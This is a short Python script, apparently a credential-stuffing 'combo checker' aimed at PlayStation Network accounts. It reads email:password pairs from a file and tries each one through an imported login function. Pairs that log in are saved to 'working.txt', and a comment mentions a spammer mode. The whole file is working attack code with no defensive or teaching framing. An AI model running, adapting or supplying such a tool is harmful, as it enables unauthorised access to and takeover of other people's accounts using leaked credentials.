import requests, json, random, time, sys, base64
from psnlib import * 

## Config
delay  = 3                   # Delay between messages (seconds)
comboList = "users.txt"      # Userlist (if using spammer)
combosOutput = "working.txt" 
## /Config

# Main flow
users = open(comboList, "r").read().strip().replace("\r", "").split("\n")
onlyonce = False

for user in users:
    email = user.split(":")[0]
    password = user.split(":")[1]

    response = login(email, password)

    print "[E: %s | P: %s]%s" % (email, password,
                                 (40 - len(email) - len(password)) * " "),

    response = login(email, password)

    # Did it succeed?
    if not response:
        print "\033[91mFailed\033[0m"
    else:
        print "\033[92mSuccess\033[0m"
        open(combosOutput, "a").write("%s:%s\n" % (email, password))